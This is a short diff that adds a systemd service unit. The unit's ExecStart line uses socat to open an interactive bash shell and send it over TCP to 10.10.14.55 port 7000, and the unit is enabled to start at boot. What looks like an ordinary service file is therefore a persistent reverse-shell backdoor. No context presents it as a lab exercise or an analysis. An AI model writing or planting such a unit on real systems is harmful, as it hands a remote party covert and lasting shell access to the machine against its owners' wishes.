@@ -1,0 +1,5 @@
+[Service]
+ExecStart=/bin/sh -c "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.55:7000"
+
+[Install]
+WantedBy=multi-user.target
